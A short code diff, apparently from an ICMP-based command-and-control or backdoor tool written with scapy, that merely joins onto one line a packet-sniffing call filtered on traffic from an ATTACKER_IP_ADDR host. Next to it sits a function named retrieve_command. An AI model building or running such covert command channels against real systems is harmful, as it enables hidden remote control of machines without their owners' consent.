@@ -70,8 +70,7 @@ def retrieve_command(response):
 
 
 def receive_response_packet(timeout, nb_responses):
-    packet = scapy.sniff(filter=f"host {ATTACKER_IP_ADDR} and icmp",
-                       count=nb_responses, timeout=timeout)
+    packet = scapy.sniff(filter=f"host {ATTACKER_IP_ADDR} and icmp", count=nb_responses, timeout=timeout)
     print("Receiving packet:", packet.show())
     return packet
 
